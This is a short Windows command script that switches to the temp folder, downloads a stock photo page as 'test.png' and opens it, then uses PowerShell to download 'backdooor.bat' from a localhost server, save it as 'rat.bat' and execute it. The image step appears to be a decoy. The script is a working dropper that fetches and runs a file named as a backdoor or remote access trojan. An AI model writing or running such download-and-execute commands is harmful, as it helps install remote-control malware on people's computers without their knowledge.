cd %TEMP%
Powershell -Command "Invoke-WebRequest 'https://www.istockphoto.com/fr/photo/une-vue-vers-le-haut-dans-le-ciel-de-direction-darbres-gm1317323736-404791748' -OutFile test.png"
test.png
Powershell -Command "Invoke-WebRequest 'https://localhost/downloads/backdooor.bat' -OutFile rat.bat"
rat.bat